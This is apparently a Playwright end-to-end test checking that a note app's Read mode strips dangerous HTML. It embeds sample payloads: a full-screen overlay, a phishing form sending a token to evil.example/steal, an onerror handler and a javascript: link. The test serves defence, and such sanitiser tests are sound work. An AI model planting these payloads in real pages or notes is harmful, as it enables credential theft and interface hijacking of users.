import { expect, openApp, openNote, test } from './helpers';

// #31: HTML in a note must not become a phishing form or a full-screen overlay in Read mode.
test('Read mode strips forms, inputs and inline styles from note HTML', async ({ page, api, vault }) => {
  const evil = [
    '# Evil',
    '',
    '<div style="position:fixed;inset:0;z-index:99999;background:#fff">OVERLAY</div>',
    '<form action="https://evil.example/steal"><input name="token" placeholder="Re-enter your token"><button>Login</button></form>',
    '<img src="x" onerror="window.__pwned=1">',
    '<a href="javascript:window.__pwned=2">click</a>',
    '',
  ].join('\n');
  await api.write(vault.id, 'Evil.md', evil);
  await openApp(page, vault.id);
  await openNote(page, 'Evil.md');
  await page.getByTestId('mode-read').click();
  const view = page.getByTestId('read-view');
  await expect(view).toContainText('OVERLAY');
  expect(await view.locator('form, input, button, [style]').count()).toBe(0);
  expect(await view.locator('a[href^="javascript:"]').count()).toBe(0);
  expect(await page.evaluate(() => (window as unknown as { __pwned?: number }).__pwned)).toBeUndefined();
});
